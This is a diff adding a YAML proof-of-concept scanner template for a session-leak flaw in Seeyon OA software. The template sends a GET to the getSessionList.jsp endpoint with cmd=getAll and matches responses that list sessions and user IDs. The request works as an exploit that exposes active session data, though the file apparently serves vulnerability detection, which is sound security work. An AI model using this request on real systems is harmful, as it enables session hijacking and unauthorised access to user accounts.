@@ -1,0 +1,21 @@
+id: poc-yaml-seeyon-session-leak
+info:
+  name: Seeyon Session Leak
+  severity: medium
+  tags:
+  - 信息泄露
+  finger: Seeyon Session Leak
+  reference: []
+  description: null
+variables: {}
+transport: http
+requests:
+- method: GET
+  path: /yyoa/ext/https/getSessionList.jsp?cmd=getAll
+  headers: {}
+  data: null
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 200 && contains(body, "<SessionList>\r\n<Session>\r\n<usrID>")
+  output: []
